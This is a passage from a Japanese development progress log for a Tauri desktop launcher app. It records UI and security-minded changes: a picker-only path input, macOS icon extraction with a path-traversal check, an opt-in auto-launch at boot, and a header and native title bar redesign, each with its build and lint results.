- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）→ 成功（67 modules、CSS 29.11 kB）
- **実機表示（`tauri dev`）は未実施**: 初回 OS 追従 / 設定で 3 択即時反映 / 再起動後保持 / システム時 OS 変更追従 / ライト・ダーク双方で全画面（メイン/ツール追加/プリセット追加/診断/設定/サイドバー/プレビュー）が破綻しない、をユーザー環境で確認をお願いしたい。

### やっていないこと（スコープ外）

- 019「PC起動時の動作」「起動間隔を設定」プレースホルダは未実装（温存）/ 015 トークンの再設計 / テーマの外部同期・クラウド保存 / 設定画面のテーマ以外の項目 / アニメ付きトランジション / 新ライブラリ・外部リソース追加なし（§CSP・ローカル保存のみ）。

## 2026-07-11 (017 Tool Path Input Lock)

### 完了したこと

- ツール追加/編集画面（`screens/add-tool/AddToolScreen.tsx`）の**実行ファイルパス欄を編集不可（readOnly）**にし、パスの値設定を既存の `open()` ピッカー（「アプリを選択」）経由のみに限定した（ユーザー要望 7）。任意パスの手打ちを排除し、docs/security.md §2 / §7 の「frontend から任意パスを自由入力させない」方針と整合させた。
- Rust 側の検証（`tools/service.rs::validate` / `process/service.rs::validate_executable`）は**変更なし**。frontend の非活性化だけに依存せず、保存時・起動時の検証を引き続き最終防衛線とする。

### 値更新経路をピッカーのみに限定

- 変更前は `setExecutablePath` の呼び出しが 3 経路: (1) `useEffect` の DB 由来初期化、(2) `selectFile()` の `open()` 成功時、(3) パス `<input>` の `onChange` 手打ち。
- (3) の `onChange` を除去して手打ち経路を排除。残るのは (1) DB 由来の復元と (2) ピッカーのみ。`handleSave` は `executablePath` を読むだけ、`guessNameFromPath` は name 側にしか書かないため、他に手打ち経路はない。

### readOnly / disabled の選択と理由 → **readOnly を採用**

- パスは「設定済みの有効な値」でユーザーが目視確認・**コピー**したい情報 → readOnly なら選択・コピーが残る。
- `disabled` のグレーアウトは「無効/使用不可」に見え、値が入っているのに壊れて見える恐れ。readOnly の方が「値は設定済み・ここでは打てないだけ」の意図に合う。
- 値は React state 由来（ネイティブ form 送信ではない）なので送信可否の差は無関係。可読性・コピー性・意味の一致で readOnly が優る。
- 実装は input に `readOnly` 付与＋`onChange` 除去（readOnly があれば制御 input の警告は出ない）。

### ヘルプ文言の変更

1. パネル見出し説明: `〜選びます。パスは直接入力もできます。` → `〜選びます。パスは「アプリを選択」からのみ設定できます。`
2. パス欄 fieldHelp: `「アプリを選択」で自動入力されます。直接入力・編集も可能です。` → `「アプリを選択」からのみ設定できます。直接入力・編集はできません。`

### 据え置き（変更なし）

- 未選択時のドロップゾーン導線（「アプリを選択」ボタン・`.exe/.app/その他` チップ）を維持。
- 選択済み `selectedApp` カード（アイコン文字＋名前＋パス表示）は据え置き。アイコン方式は 018 スコープのため本タスクでは変更しない。
- パス以外のフォーム項目（表示名・説明・アイコンラベル・プリセット系 select）と名前自動推測（`guessNameFromPath`）は既存挙動のまま。

### 作成・変更ファイル

- 変更: `apps/desktop/src/screens/add-tool/AddToolScreen.tsx`（パス input を readOnly 化＋onChange 除去、ヘルプ文言 2 箇所更新）。
- 変更: `docs/progress.md`（本記録）。
- CSS 変更なし / 新規ライブラリ・外部リソース追加なし / Rust 側変更なし / OS・ファイル・プロセス操作の追加なし（既存 `open()` の利用範囲を変えない）。

### 検証結果

- `git diff --stat` → `AddToolScreen.tsx` のみ（3 insertions / 3 deletions）＋ `docs/progress.md`。変更範囲が想定内。
- `grep -rn setExecutablePath apps/desktop/src` → 値更新は L56（DB 復元）と L74（ピッカー）のみ。手打ち経路なしを確認。
- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- **実機表示（`tauri dev`）は未実施**: パス欄が直接編集できない / ピッカーからのみ設定 / 新規作成・編集・保存・更新・名前自動推測が従来どおり / 文言更新 / 未選択導線と選択済みカード維持、をユーザー環境で確認をお願いしたい。

## 2026-07-11 (018 Tool Icon Auto-Extraction)

### 完了したこと

- ツール追加/編集画面で、ユーザーがピッカー（017 で確定）で選んだ実行ファイルの**実アイコンを選択時に一度だけ自動抽出**し、`data:` URI（base64 PNG, ≤128px）で表示・DB 保存する仕組みを追加した（ユーザー要望 6）。抽出できない形式は従来の 1 文字ラベル（`toIconLetter`）にフォールバックする。
- 抽出は Rust の**限定的な読み取り専用コマンド** `extract_app_icon(path) -> AppResult<Option<String>>`（`tools/commands.rs`、ロジックは新規 `tools/icon.rs`）に閉じ込め、frontend からは選択済みパスのみを渡す。非対応・失敗・パス検証 NG はすべて `Ok(None)`。

### プラットフォーム別抽出方式

- **macOS `.app`**: `Contents/Info.plist` を `plist` でパース → `CFBundleIconFile`（拡張子無しなら `.icns` 補完）→ `Contents/Resources/<name>.icns` を `icns` でデコード → 最大サイズ画像を `image` で ≤128px にリサイズ（縮小のみ・Lanczos3）→ PNG エンコード → `base64` 化。`CFBundleIconFile` 無し / `.icns` 不在 / Assets.car（`CFBundleIconName`）方式は `Ok(None)`（既知の限界・文字フォールバック）。
- **Windows `.exe`**: 今回は **`Ok(None)` スタブ**（決定事項）。この開発環境が macOS で `#[cfg(windows)]` を `cargo check` でコンパイル検証できないため、未検証コードを混ぜない。将来、Windows 実機/CI が使える別タスクで `windows` クレートの feature 追加（`Win32_UI_Shell` / `Win32_Graphics_Gdi`）＋埋め込みアイコン抽出を実装する（TODO）。
- **Linux / 非バンドル / スクリプト**: `Ok(None)`。

### 追加依存とその理由（docs/security.md §10）

- すべて **macOS ターゲット限定**（`[target.'cfg(target_os = "macos")'.dependencies]`。既存 `sysinfo` の mac 限定パターンに倣う）。用途はアイコン抽出のみ・外部通信なし・pure-Rust。
  - `plist`（Info.plist の XML/バイナリ両対応パース）
  - `icns`（`.icns` デコード・最大サイズ取得）
  - `image`（PNG エンコード + ≤128px リサイズ。`default-features = false, features = ["png"]` で最小化）
  - `base64`（PNG → data URI 用 base64 文字列）
- `plist` / `base64` は **tauri の既存推移依存**で新規増分クレートは無く、直接依存追加は `image` / `icns`（＋そのサブ依存）のみ。
- 代替 `systemicons`（単一クレートで mac/win 両対応）は Linux で GTK を引き込み・監査性が下がるため「target 別・pure-Rust・監査可能」方針に反すると判断し不採用。macOS の objc2/AppKit `NSWorkspace.iconForFile`（Assets.car も取得可）は Objective-C ランタイム依存＋NSImage→TIFF 変換が増えるため不採用（`.icns` を持たないアプリは文字フォールバックになるトレードオフを許容）。

### スキーマ変更 / `ensure_column` 設計

- `tools` に nullable `icon_png TEXT` を追加。マイグレーション基盤が無いため、冪等ヘルパ **`util.rs::ensure_column(conn, table, column, decl)`** を新設: `SELECT 1 FROM pragma_table_info(?1) WHERE name = ?2`（table/column をバインド）で存在確認し、未存在時のみ `ALTER TABLE {table} ADD COLUMN {column} {decl}` を実行。`tools::repository::init` の `CREATE TABLE IF NOT EXISTS` 直後に `ensure_column(conn, "tools", "icon_png", "TEXT")` を呼ぶ。既存 DB でも起動時に落ちない。019 でも共用する。
- ADD COLUMN は識別子をバインドできないため `format!` 生成だが、`table`/`column`/`decl` は**呼び出し側のコンパイル時定数のみ**（ユーザー入力を渡さない・doc に明記）。
- モデル: `Tool` に `icon_png: Option<String>`（`#[ts(optional)]`）、`CreateToolInput` / `UpdateToolInput` に `#[serde(default)] #[ts(optional)] icon_png`。repository（`TOOL_COLUMNS` / `row_to_tool` / `insert` / `update`）と service（`create` / `update`）は**正規化せずそのまま通す**。ts-rs 再生成で `iconPng?` を frontend 型に反映。

### 出力サイズ制限 / data URI 方針

- 出力は ≤128px（`width.max(height) > 128` のときのみ縮小）にしてから PNG 化 → DB 肥大化を防止。
- 表示は `data:image/png;base64,...`（`display.ts::iconDataUri`）。**PNG のファイル出力 / asset protocol / `convertFileSrc` は使わない**（`fs`・asset-protocol scope を足さない）。CSP は `csp: null` のまま変更なし・外部通信ゼロ。
- frontend 配線: `AddToolScreen.selectFile()` で選択直後に `extractAppIcon` を invoke し state 保持（失敗はフローを止めず null）。保存ペイロードに `iconPng` を含める。表示は `IconTile` に任意 `imageSrc` を追加し「PNG あれば画像・無ければ文字」に統一（一覧 `ToolRow` / メインのツールピッカー / `PreviewCard` / サイドバー / プリセット追加）。

### セキュリティレビュー結果（security-review 実施済み・必須）

- 判定: **軽微な懸念あり → 1 点ハードニングを適用済み**。
- 適用した修正: `resolve_icns` で `Info.plist` を信頼せず、`CFBundleIconFile` に `/`・`\`・`..` を含む値は拒否（`Ok(None)`）。バンドル外 `.icns` の読み取り（パストラバーサル）を防ぐ（§7/§8）。正当な値は Resources 直下のベース名のため副作用なし。
- 確認済み: `extract_app_icon` は読み取り専用（`File::open`／`plist::from_file` のみ・write/delete/network なし）で任意パスの自由読取ではない（read 前にパス検証・`.app` バンドルのみ抽出）。出力 ≤128px。エラーは `Ok(None)` に丸めフルパスをログ/UI に出さない（§9）。`csp:null`／capabilities 不変（asset-protocol・`fs` 強権限を追加していない）。外部通信ゼロ。追加依存は mac gate・最小で理由を明記（§3/§4/§10）。

### 作成・変更ファイル

- 新規（Rust）: `apps/desktop/src-tauri/src/tools/icon.rs`。
- 変更（Rust）: `Cargo.toml`（mac gate 依存追加）/ `src/lib.rs`（コマンド登録）/ `tools/{commands,mod,model,repository,service}.rs`（`extract_app_icon` 配線・`icon_png` 永続化・`init` で `ensure_column`）/ `util.rs`（`ensure_column` 新設）。
- 再生成（ts-rs）: `features/tools/bindings/{Tool,CreateToolInput,UpdateToolInput}.ts`。
- 変更（frontend）: `features/tools/{toolApi,display}.ts` / `types.ts` / `screens/add-tool/AddToolScreen.tsx`(+css) / `components/{primitives,PreviewCard,Sidebar}.tsx`(+css) / `screens/main/{MainScreen,ToolRow}.tsx` / `screens/add-preset/AddPresetScreen.tsx`。

### 検証結果

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `cd apps/desktop/src-tauri && cargo check` → 成功（ハードニング適用後も success）
- `pnpm --filter ./apps/desktop gen:bindings` → 24 tests ok（`iconPng?` を再生成）
- **実機表示（`tauri dev`）は未実施**: `.app` 選択で実アイコンがプレビュー表示 / 抽出不可形式は文字にフォールバック（クラッシュしない）/ 保存後に一覧・サイドバー・プレビューでアイコン表示 / 既存 DB でも起動後に落ちない（`ensure_column` 冪等）/ 再起動後も保持、をユーザー環境（macOS）で確認をお願いしたい。

### やっていないこと（スコープ外）

- Windows(.exe) の実アイコン抽出（今回 `Ok(None)` スタブ・別タスク）/ アイコンの手動アップロード・差し替え / リモート取得 / PNG のファイル出力＋asset protocol 参照 / 一覧表示時の都度再抽出 / `.lnk` 実体解決・`.bat` 対応 / テーマ連動・加工 / 017 のパス入力ロック・`validate` / `validate_executable` の変更。

## 2026-07-11 (018 バグ修正: Assets.car のみのアプリで実アイコンが出ない)

### 事象と原因

- macOS で `Calendar.app` を登録しても実アイコンが反映されず、文字ラベルにフォールバックしていた。
- 原因は macOS 抽出が `Info.plist` → `CFBundleIconFile` → `Contents/Resources/<name>.icns` の**レガシー経路のみ**だったこと。`Calendar.app` は `CFBundleIconFile` を持たず（`CFBundleIconName = AppIcon` のみ）、`.icns` も存在せず、アイコンは `Assets.car`（コンパイル済みアセットカタログ）内にのみある。`resolve_icns` が即 `None` を返し `Ok(None)` → 文字表示になっていた。Apple システムアプリに多い失敗クラス（Chrome/VSCode/Notes/Safari/Terminal 等は `.icns` を持つため既存経路で成功）。フロント〜DB の配線は元々正しく、欠陥は抽出のみ。

### 修正内容（保守的ハイブリッド）

- 既存の pure-Rust `plist`+`icns` 経路を**主経路として維持**し、`.icns` 解決が `None` のときだけ AppKit の `NSWorkspace.iconForFile:`（Finder が表示する実アイコン。`.icns` / `Assets.car` の双方を透過的に扱う）にフォールバックする（`tools/icon.rs::macos::nsworkspace_icon_png`）。取得した NSImage → TIFF → `NSBitmapImageRep` → PNG バイト列にし、既存の ≤128px リサイズ＋base64 経路（新設共通ヘルパ `encode_png_base64`）を再利用する。
- 主経路の挙動は不変（`.icns` を持つアプリは従来どおり）。`.app` ゲートも維持し、非バンドルは引き続き `Ok(None)`。読み取り専用・外部通信なし。

### 追加依存とその理由（docs/security.md §10）

- macOS 限定で `objc2-app-kit` / `objc2-foundation` を追加（`[target.'cfg(target_os = "macos")'.dependencies]`）。用途はアイコン取得のみ。
- **いずれも Tauri が既定 feature 付きで依存ツリーに導入済み**（Cargo.lock に解決済み。`objc2` 0.6 / `objc2-app-kit` 0.3 / `objc2-foundation` 0.3）。feature は cargo により union されるため、直接依存追加による**新規ビルド面・監査面の増分は実質ゼロ**。
- これは 018 初版で NSWorkspace を不採用とした判断（progress 上記 018 節）の**フォールバック限定での見直し**。`.icns` を持たないアプリ（Calendar 等）が文字フォールバックになる制約を解消するため、主経路の pure-Rust 方式は残したまま最終手段として採用した。

### 変更ファイル

- `apps/desktop/src-tauri/Cargo.toml`（mac gate 依存 `objc2-app-kit` / `objc2-foundation` 追加）
- `apps/desktop/src-tauri/src/tools/icon.rs`（`macos::extract` にフォールバック分岐追加・`nsworkspace_icon_png` 新設・`encode_png_base64` 共通化）

### セキュリティ（実装後 security-review 必須）

- 読み取り専用（アイコン取得のみ・write/delete/network なし）。パスは既存 `validate_icon_path` を通過したユーザー選択パスのみ。出力 ≤128px 維持。CSP(`csp:null`) / capabilities 不変。`representationUsingType:properties:` のみ `unsafe`（generics 整合が呼び出し側責任のため）で、他の AppKit 呼び出しは安全メソッド。

### 検証

- `cargo check` / `pnpm typecheck` / `pnpm lint`、および `tauri dev` で Calendar 実アイコン表示・`.icns` アプリ（Chrome）の非退行・抽出不可時の文字フォールバックを確認する。

## 2026-07-11 (019 Preset Auto-Launch on Boot)

### 完了したこと

- プリセット追加/編集画面（`AddPresetScreen.tsx` Step1）に **per-preset トグル「PC起動時にプリセット自動起動」** を追加した（ユーザー要望 5）。有効化したプリセットは、PC 起動 → stream-dock 自動起動（`--autostart`）→ そのプリセットのツール一括起動が無人で走る。
- ユーザー向けのグローバル ON/OFF UI は作らず、**「`auto_launch_on_boot` フラグ付きプリセットが 1 つ以上 ⇔ ログイン項目 ON」という不変条件を reconcile で導出**する方式にした。

### autostart プラグイン導入理由（docs/security.md §5 / §10）

- ログイン項目は永続的な OS 連携（§10 レビュー対象）。手書きの LaunchAgent plist / レジストリ書込は §5 違反のため、公式 `tauri-plugin-autostart = "2"`（macOS は `MacosLauncher::LaunchAgent`）を導入した。OS がログイン時に起動する際に `--autostart` を渡す設定（`Some(vec!["--autostart"])`）にし、起動時フックで手動起動と区別する。
- 追加された推移依存: `auto-launch` / `dirs` / `dirs-sys` / `redox_users` / `winreg`（プラグインの依存。いずれもローカルのログイン項目登録用で外部通信なし）。

### reconcile の不変条件と置き場（command 層）

- `presets/commands.rs` に private `reconcile_autostart(app: &AppHandle, conn: &Connection)` を新設。`repository::count_auto_launch_on_boot` が 1 以上なら `enable()`、0 なら `disable()`。`is_enabled()` でガードし冗長な OS 書込を避ける。OS 書込失敗は best-effort（UI をブロックせず `app_logs` に Warn 記録）。
- 呼び出しタイミング: `create_preset` / `update_preset` / `delete_preset` の service 成功後（各 command に `app: AppHandle` 引数を追加）、および起動時（setup）。前回セッションで全フラグ解除された場合も起動時 reconcile で是正される。
- OS 連携は `AppHandle` を持てる command 層のみで行い、`&Connection` しか持たない service 層では触らない。reconcile は Rust 側 `ManagerExt`（IPC 非経由）で行う。

### 起動時フック（既存一括起動の再利用）— lib.rs setup

- DB/registry を manage したあと `std::env::args()` に `--autostart` が含まれるときのみ、`lib.rs::boot_launch_presets` を **別スレッド**で実行（ウィンドウ生成をブロックしない）。`AppHandle` を clone し、スレッド内で `handle.state::<DbState>()` / `state::<ProcessRegistry>()` を取得。
- 起動は既存 `process::service::{resolve_preset_targets, launch_preset_targets}` を再利用（`launch_preset` command と同処理・新規 spawn 経路なし）。DB ロックは targets 解決時のみ取得し spawn 前に解放。開始/完了を `app_logs`（`LogCategory::BulkLaunch`, operation `autostart_launch_preset`）に記録（launch_preset と同じ成功/一部失敗/全失敗の分岐）。
- 手動起動（`--autostart` 無し）では自動起動を発火させない。
- ウィンドウ: `tauri.conf.json` は**未変更**（デフォルト visible:true）。setup で `show()` のみ行い、手動起動・自動起動とも**通常表示**（最小化しない・ユーザー確認済み。自動起動時も、立ち上がったツールを管理しやすいため）。ダイアログ等でブロックしない。トレイは作らない（スコープ外）。

### スキーマ変更（`ensure_column` 再利用）

- `presets` に `auto_launch_on_boot INTEGER NOT NULL DEFAULT 0` を、018 新設の冪等ヘルパ `util::ensure_column(conn, "presets", "auto_launch_on_boot", "INTEGER NOT NULL DEFAULT 0")` で `presets::repository::init` の `CREATE TABLE IF NOT EXISTS` 直後に追加（既存 DB でも落ちない）。table/column/decl はコンパイル時定数のみ。
- bool 保存は既存 `preset_items.enabled` の慣用を踏襲（`as i64` 書込 / `i64 != 0` 読取）。`PRESET_COLUMNS` / `row_to_preset` / `insert` / `update` に配線。reconcile・起動時用に `count_auto_launch_on_boot` / `list_auto_launch_on_boot` を追加。
- モデル: `Preset` に `auto_launch_on_boot: bool`、`CreatePresetInput` / `UpdatePresetInput` に `#[serde(default)] #[ts(optional)] auto_launch_on_boot: Option<bool>`。service の `create`（既定 false）/ `update`（未指定は既存値維持）で通す。ts-rs 再生成で `autoLaunchOnBoot` を frontend 型に反映。

### capabilities / 設定

- `capabilities/default.json` に autostart の **3 permission のみ** 追加（`autostart:allow-enable` / `allow-disable` / `allow-is-enabled`）。広い scope は足さない。
- `Cargo.toml` に `tauri-plugin-autostart = "2"`、`lib.rs` builder に `.plugin(tauri_plugin_autostart::init(...))`。`tauri.conf.json` は**未変更**（window 制御は setup の `show()` のみ。CSP `csp:null` 不変・外部通信ゼロ）。

### frontend 配線

- `AddPresetScreen.tsx`: `autoLaunchOnBoot` state を追加、`editingPreset?.autoLaunchOnBoot ?? false` で初期化、Step1 の説明フィールド直後にトグル（素の `<input type="checkbox">` + `AddPresetScreen.module.css` に `.bootToggle`）を配置。`createPreset` / `updatePreset` の payload に `autoLaunchOnBoot` を含める。016 設定画面とは独立。

### 既知の限界

- **アンインストール時にログイン項目（macOS `~/Library/LaunchAgents/<identifier>.plist` 等）が OS 側に残留し得る**。アンインストーラでのクリーンアップは MVP スコープ外（docs/security.md に明記）。ユーザーの手動削除でも解除可能。
- `tauri-plugin-single-instance`（二重起動対策）は未導入（別途検討）。起動順の高度制御・自動停止・OS 再起動をまたいだプロセス復元はスコープ外。
- **Windows(レジストリ Run キー)/Linux(.desktop) の autostart 登録経路は macOS 開発環境ではコンパイルのみで実挙動未検証**（動作対象は macOS/LaunchAgent のみ）。自動一括起動が再利用する `launch_preset_targets` も 013 由来のプラットフォーム差（macOS `/usr/bin/open` 縮退）を継承する。

### セキュリティレビュー結果（security-review 実施済み・必須）

- 判定: **問題なし（修正必須なし）**。外部通信ゼロ / 新規 spawn 面・shell・汎用 command なし / frontend から渡るのは `autoLaunchOnBoot`(bool) のみ（`app: AppHandle` は Tauri 自動注入）/ 起動時起動は既存 `validate_executable`・保存済み path 経由のみ / `--autostart` ゲートで手動起動時は非発火 / 全フラグ解除で `disable()` 保証（`is_enabled()` ガード）/ ログは固定文言＋preset_id(uuid) のみ / capabilities は autostart 3 permission 限定 / CSP 不変。
- 後回し（実害なし）: reconcile を DB ロック保持中に OS 呼び出しする点（ユーザー操作頻度低・将来ロック外へ出す余地）。capabilities 3 permission は Rust 側 `ManagerExt` 使用のため JS からは未使用だが最小構成で攻撃面を広げない。

### 検証結果

- `cargo check` → 成功（`tauri-plugin-autostart` 取得後も success）
- `pnpm --filter ./apps/desktop gen:bindings` → 24 tests ok（`autoLaunchOnBoot` 再生成）
- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `git diff --stat` → 変更範囲は 019 想定内（Cargo.lock/Cargo.toml/capabilities/lib.rs/presets 各ファイル/tauri.conf.json/presets bindings 3 件/AddPresetScreen.tsx(+css)/docs）。
- **実機表示（`tauri dev`）は未実施**: トグル保存・再表示 / 有効化でログイン項目登録・全解除で解除 / `--autostart` 付き起動でフラグ付きプリセットが通常表示＋自動一括起動しウィンドウ生成をブロックしない / 手動起動では非発火 / 既存 DB でも落ちない、をユーザー環境（macOS）で確認をお願いしたい。

### やっていないこと（スコープ外）

- グローバルな「起動時にアプリを起動」ON/OFF UI / `tauri-plugin-single-instance` / 起動順の高度制御・待機秒数 / 自動停止・スケジューリング / OS 再起動をまたいだプロセス復元 / MainScreen「起動間隔を設定」プレースホルダ / トレイ / 018・017 の既存パス検証（`validate_executable`）の変更。

## 2026-07-11 (020 App Header (Docker-like))

Docker Desktop 風の共通ヘッダーを全画面に常設。従来、設定/診断への遷移はサイドバー下部の ghost ボタンのみで、サイドバーは `screen === "main"` のときしか出ないため他画面で導線が消えていた。ヘッダーへ一本化し、全画面に常時表示する。**frontend のみの変更**（OS/ファイル/プロセス操作は追加せず、外部リソースも読み込まない）。

### ヘッダー構成（新設 `components/Header.tsx` ＋ `Header.module.css`）

- props: `activeNav?: Extract<Screen, "diagnostics" | "settings">` / `onNavigate: (s: Screen) => void`。
- 左（brand）: 同梱アプリアイコン `public/icon.png` を `<img src="/icon.png" alt="" />` で表示＋「StreamDock」ワードマーク。**アイコン調達 = 同梱アセットのみ**（外部フォント/CSS/CDN/リモート画像なし・docs/security.md §CSP 準拠）。
- 右（nav）: 現行絵文字 🩺（診断 / ログ）・⚙（設定）を流用したアイコンボタン。`title` / `aria-label` 付与、`activeNav` に応じ `.active`（`--primary-soft` 系）表示。
- ヘッダーは**アプリ名バーに徹する**（各画面の見出しは各 screen の `layout.pageTitle` が持つため二重見出しにしない）。
- CSS は role トークン（`var(--...)`）のみ。生 hex/rgba なし（背景 `--surface` / 区切り `--line` / ボタン `--btn-ghost-*` / active `--primary-soft*`）。

### Window 再構成方式（外側 flex ラップ）

- `Window` に `header?: ReactNode` prop を追加。`{ header?, sidebar?, children }`。
- `.shell`（`flex-direction: column; height:100%`）直下にヘッダー行 ＋ `.body` を置く縦構成。`.body` は従来の 2 カラム grid（`300px 1fr` / `flex:1; min-height:0; overflow:hidden`）で `sidebar | main` を保持。`.fullWidth` 修飾子は `.body` へ移設。
- ヘッダーは sidebar 有無に関わらず常時表示。既存 `.window` の grid ルールはそのまま `.body` へ移しただけで、本体レイアウトの挙動は不変。

### サイドバーからの移設（`Sidebar.tsx` / `Sidebar.module.css`）

- `Sidebar.tsx` の診断/設定 ghost ボタン section（🩺 / ⚙）を削除しヘッダーへ一本化。
- 未使用になった型/スタイルを整理: `activeNav` prop の型を `Extract<Screen, "add-preset" | "add-tool" | "diagnostics" | "settings">` → **`Extract<Screen, "add-preset" | "add-tool">`** へ narrow。`Sidebar.module.css` の隣接 ghost 専用ルール `.ghost + .ghost { margin-top: 8px }`（＋コメント）を削除（`.ghost` / `.ghost.active` / `.ghost:disabled` は add-preset / add-tool ghost が継続使用のため残置）。

### App 配線（`App.tsx`）

- `Header` を import。`activeNav = screen === "diagnostics" || screen === "settings" ? screen : undefined` を導出し、`<Window header={<Header activeNav={activeNav} onNavigate={handleNavigate} />} ...>` で渡す。`handleNavigate` は既存流用（diagnostics/settings/add-* を既に捌ける）。

### 検証結果

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `*.module.css` の生 hex/rgba なし（Header/Window とも全て `var(--...)`）を確認。
- 変更範囲: `App.tsx` / `components/{Header.tsx,Header.module.css(新規),Window.tsx,Window.module.css,Sidebar.tsx,Sidebar.module.css}` / `docs/progress.md`。`types.ts` は変更なし。
- **実機表示（`tauri dev`）は未実施**: 全画面（main / add-tool / add-preset / diagnostics / settings）でヘッダー常時表示 / 左にアイコン＋StreamDock・右に診断/設定 / ヘッダーから遷移でき現在画面が active / サイドバー下部 ghost が消えヘッダーへ一本化 / 二重見出しなし / sidebar 有(main)・無(他)ともレイアウト非破綻 / ライト・ダーク双方非破綻、をユーザー環境（macOS）で確認をお願いしたい。

### やっていないこと（スコープ外）

- ネイティブ枠のカスタム化（カスタムタイトルバー・ドラッグ領域・信号機ボタン移動）/ ヘッダー遷移先の新規機能画面そのものの追加（土台のみ）/ プリセット・ツール管理の導線変更（サイドバーの ＋追加・一覧は据え置き）/ 配色・ボタンのモダン化（021）/ フォーム文言・項目の変更（022）/ 新規ライブラリ・外部リソースの追加。

### 020-b 追従修正（ヘッダー配色 primary ＋ アプリアイコン blend・ユーザー要望）

- **アイコンのリンク切れ修正**: 当初の `<img src="/icon.png">` は `apps/desktop/public/` に `icon.png` が無く表示されていなかった（アプリアイコンPNGは `src-tauri/icons/` にある）。`src-tauri/icons/128x128.png` を `public/icon.png` へコピー配置し、`src="/icon.png"` を有効化（同梱アセットの複製・外部通信なし・CSP 準拠）。`Header.tsx` は変更なし。
- **ヘッダー配色を primary に**（`Header.module.css` のみ・生 hex なし）: `.header` 背景 `--surface` → `--primary`、`border-bottom` 撤去（色差で境界十分）。`.wordmark` 文字色 `--text` → `--btn-primary-fg`（primary 上で両テーマ白系＝可読）。`.logo` は角丸フレーム（`border-radius`）を撤去しアイコン地をヘッダーに溶け込ませ、白マークだけ見せる（サイズ 26→30px）。`.navBtn.active` は primary 上で埋もれる `--primary-soft` を `--surface` チップに変更して可視化。
- **テーマ差の既知挙動**: ダークはヘッダー `--primary`(#2f6bff) とアイコン地がほぼ一致し白マークのみ浮く（狙いどおり）。ライトは `--primary`(#0036cb) がより濃く、アイコン地は固定の明るい青のため白マーク周りに薄い青のバッジ状の縁が残る（破綻なし。テーマ別アイコン差し替えはスコープ外）。
- 検証: `typecheck` / `lint` 成功、`Header.module.css` に生 hex/rgba なしを確認。実機表示（`tauri dev`）はユーザー環境で確認依頼。

## 2026-07-11 (021 Custom Native Title Bar (Docker Desktop 風))

020 のアプリ内ヘッダーを **OS ネイティブのウィンドウ枠に統合**し、タイトルバー領域に primary ヘッダーを出す（ユーザー要望）。020 で「ネイティブ枠のカスタム化」はスコープ外としていたため、その非目標を反転させる新規タスク。採用方式は **OS 別ネイティブ**（ユーザー確認済み）。macOS / Windows 両対応。

### ウィンドウ枠方式（OS 別）

- **macOS**: `tauri.conf.json` の window に `titleBarStyle: "Overlay"` / `hiddenTitle: true` / `trafficLightPosition: {x:16, y:28}` を追加。ネイティブ信号機（赤黄緑）を残しつつ Web コンテンツをタイトルバー領域まで延伸。65px の背高ヘッダー内で信号機を縦中央寄りに配置。自作ボタンは出さない。
- **Windows**: static config の `decorations` 衝突を避けるため、`lib.rs` setup の既存 `get_webview_window("main")` ブロック内で `#[cfg(target_os = "windows")]` 時のみ `window.set_decorations(false)` を実行してフレームレス化。右端に自作 min/max/close を描画。
- 両 OS ともヘッダー領域を `data-tauri-drag-region` でドラッグ移動可能に。

### プラットフォーム判定

- `lib.rs` に自前コマンド `host_os()`（`std::env::consts::OS` を返すのみ・入力なし・固定文字列）を追加し `invoke_handler` に登録。自前コマンドは ACL 不要。
- frontend は `features/platform/useHostOs.ts`（新規 hook）で起動時に一度取得し、`App.tsx` → `Header` へ `hostOs` を渡す。取得失敗時は null（余白なし・制御ボタン非表示にフォールバック）。

### Header のタイトルバー化（`Header.tsx` / `Header.module.css`）

- `.header`（と非対話な `.brand`）に `data-tauri-drag-region` を付与。nav/制御ボタンは対話要素なので自動的に非ドラッグ。
- macOS の信号機回避: ルートに `data-os={hostOs}` を出し、`.header[data-os="macos"] { padding-left: 78px }` で brand の左余白を確保。
- Windows 制御ボタン: `hostOs === "windows"` のときのみ nav 右端に min/max/close を描画。`@tauri-apps/api/window` の `getCurrentWindow().minimize()/toggleMaximize()/close()` を呼ぶ。アイコンはインライン SVG（─ / □ / ✕）。close の hover は `--danger`。すべて `var(--...)` トークン（生 hex/rgba なし）。
- ヘッダー本体（primary 背景・ロゴ・ワードマーク・🩺/⚙）は 020/020-b のまま流用。二重見出しにしない方針も維持。

### capabilities（`capabilities/default.json`）※セキュリティレビュー対象

- `core:window` の変更系 permission を UI 制御に限定して追加: `allow-start-dragging` / `allow-minimize` / `allow-toggle-maximize` / `allow-close`。shell/fs/process/network は不追加。CSP（`csp: null`）不変・新規 npm/crate/plugin なし。

### 検証結果

- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `cargo check`（src-tauri）→ 成功（`host_os` / `#[cfg(windows)] set_decorations` 込み）
- `Header.module.css` に生 hex/rgba なしを確認。
- `docs/security.md` に 021 セクションを追記（core:window capabilities / frameless / host_os / Windows 未検証）。
- **実機表示（`tauri dev`）は未実施**: macOS で上部にネイティブ信号機＋primary ヘッダー / ヘッダードラッグで移動 / タイトル文字の二重表示なし / 全画面で破綻なし、をユーザー環境で確認依頼。Windows は当環境（macOS）ではコンパイルのみ・実挙動未検証。

### やっていないこと（スコープ外）

- 配色刷新（021 本来）/ フォーム文言変更（022）/ macOS の自作信号機ボタン化（ネイティブ維持のため不要）/ Linux 専用対応 / 新規ライブラリ・外部リソース・新 plugin・CSP 変更。

## 2026-07-11 セッション引き継ぎ（handoff）

### 今回完了したこと

- **020 App Header**: 全画面常設の共通ヘッダー新設（Window を外側 flex ラップで再構成、Sidebar 下部の診断/設定 ghost をヘッダーへ一本化）。typecheck/lint 通過。
- **020-b ヘッダー配色 primary ＋ アイコン blend**: `.header` 背景を `--primary` に、アプリアイコンの broken link を修正（`src-tauri/icons/128x128.png` → `public/icon.png` にコピー）。ダークは白マークが溶け込む／ライトは薄いバッジ縁が残る既知挙動。
